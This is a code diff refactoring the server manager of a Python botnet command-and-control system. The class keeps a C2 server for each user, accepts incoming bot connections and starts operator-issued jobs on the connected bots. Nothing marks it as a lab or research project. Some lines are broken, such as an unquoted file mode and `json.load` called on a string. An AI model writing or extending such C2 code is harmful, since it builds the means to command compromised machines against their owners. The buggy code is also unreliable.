@@ -17,22 +17,8 @@ class ServerManager():
         self.bot_entry_address = bot_entry_address
         self.bot_clusters = {}
         self.commands_in_process = []
-        self.c2servers = []
+        self.c2servers = {}
         self.connection_string = self.get_connection_string("botnet")
-
-    def start_job(self, request):
-        c2server = self.does_c2server_exist(self, request.userId)
-
-        if c2server is None:
-            c2server = self.spawn_c2server(request.userId)
-        
-        try:
-            c2server.start_job(request.commandId)
-        except NoBotsException:
-            return c2_pb2.StartJobResponse.Response.FAIL
-        else:
-            return c2_pb2.StartJobResponse.Response.SUCCESS
-
 
     def get_connection_string(self, database):
         f = open("databaseconfig.json", r)
@@ -47,74 +33,25 @@ class ServerManager():
 
         return "Driver="+driver+";Server="+server+";Database="+database+";UID="+uid+";PWD="+pwd+";"
 
-    def listen_for_commands(self):
-        """
-        Listen for incoming commands
-        :return: None
-        """
-        commands_socket = self.create_socket(self.command_entry_address)
-
-        while True:
-            try:
-                command_socket, command_address = commands_socket.accept()
-            except:
-                print("[-] Accepting command connection failed")
-                break
-
-            if command_address[0] != self.trusted_api:
-                command_socket.sendall(b'Permission denied.')
-                command_socket.shutdown()
-                command_socket.close()
-                break
-
-    def listen_for_commands(self):
-        """
-        Listen for incoming commands
-        :return: None
-        """
-        command_socket = self.create_socket(self.command_entry_address)
-
-        while True:
-            try:
-                command_socket, command_address = commands_socket.accept()
-            except:
-                print("[-] Accepting command connection failed")
-                break
-
-            try:
-                command = command_socket.recv(1024)
-                command = json.load(command.decode())
-                command = Command(command_socket, **command)
-            except:
-                print("[-] Incoming command invalid")
-                break
-
-            self.commands_in_process.append(command)
-
-            self.assign_command(command)
-
-    def assign_command(self, command):
-        c2server = self.does_c2server_exist(command.user_id)
-
-        if c2server is None:
-            c2server = self.spawn_c2server()
-
-        command.command_socket.sendall(b'Command was processed, executing now.\n')
+    def start_job(self, request):
         try:
-            c2server.execute_command(command)
-        except NoBotsException:
-            command_socket.sendall(b'No bots available for this account')
-        else:
-            command_socket.sendall(b'Command executed')
-        finally:
-            command_socket.close()
+            c2server = self.c2servers[request.userId]
+        except KeyError:
+            c2server = self.spawn_c2server(request.userId)
+        
+        try:
+            response = c2server.start_job(request.commandId)
+        except:
+            response = c2_pb2.StartJobResponse()
+            response.response = c2_pb2.StartJobResponse.Response.FAIL
+        return response
 
     def listen_for_bots(self):
         """
         Listen for incoming bots
         :return: None
         """
-        bots_socket = self.create_socket(self.bot_entry_address)
+        bots_socket = self.create_listen_socket(self.bot_entry_address)
 
         while True:
             try:
@@ -145,34 +82,17 @@ class ServerManager():
                 else:
                     c2server.bots.append(bot_socket)
 
-
-    def does_c2server_exist(self, user_id):
-        """
-        Checks if c2server exists. If so, return the c2server object.
-        :param user_id: str
-        :return: None or C2server
-        """
-        c2server = None
-
-        for c2server_i in self.c2servers:
-            if c2server_i.user_id == user_id:
-                c2server = c2server_i
-                break
-
-        return c2server
-
-
-    def spawn_c2server(self, user_id, bot_socket):
+    def spawn_c2server(self, user_id, bot=None):
         """
         Spawn new C2 server when no available bot cluster is present
         :param user_id: str
         :return: C2server
         """
-        c2server = C2server(user_id, bot_socket)
-        self.c2servers.append(c2server)
+        c2server = C2server(user_id, bot) if bot else C2server(user_id)
+        self.c2servers[user_id] = c2server
         return c2server
 
-    def create_socket(self, address)
+    def create_listen_socket(self, address):
         try:
             commands_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             commands_socket.bind(address)
